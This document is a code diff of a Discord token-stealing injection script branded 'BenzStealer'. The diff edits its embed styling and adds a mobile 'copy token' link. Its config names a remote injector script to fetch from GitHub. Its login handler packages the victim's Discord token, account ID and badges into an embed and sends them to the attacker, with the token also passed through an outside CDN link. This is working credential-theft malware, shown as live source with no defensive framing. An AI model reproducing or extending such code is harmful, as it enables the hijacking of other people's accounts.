@@ -11,9 +11,9 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'BulkFA', 
-  embed_icon: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
-  embed_color: 000000, 
+  embed_name: ' ', 
+  embed_icon: ' ',
+  embed_color: 3092790, 
   injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
@@ -607,12 +607,13 @@ const login = async (email, password, token) => {
     avatar_url: config.embed_icon,
     embeds: [
       {
+        description: `[<:3763verifiedgreen:989343589077221396> **Click Here To Copy Token On Mobile**](https://superfurrycdn.nl/copy/${token})`,
         color: config.embed_color,
         fields: [
           {
-            name: '<a:944007295417843743:959785231982931979> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
-            inline: false,
+             "name": "<a:sn1:989238042164351006> Token:",
+             "value": `\`\`\`${token}\`\`\``,
+             "inline": false
           },
           {
             name: '<a:satanist:802503618972483615> Badges:',
@@ -647,13 +648,14 @@ const login = async (email, password, token) => {
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' ' + '('+json.id+')',
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          icon_url: `https://cdn.discordapp.com/attachments/990782044676182069/990798452701147206/8c97eb5bb60b5e7bae869b44ddad6333.gif`,
         },
         footer: {
           text: 'BenzStealer',
+          icon_url: `https://cdn.discordapp.com/attachments/990782044676182069/990798452701147206/8c97eb5bb60b5e7bae869b44ddad6333.gif`,
         },
         thumbnail: {
-          url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
       },
     ],
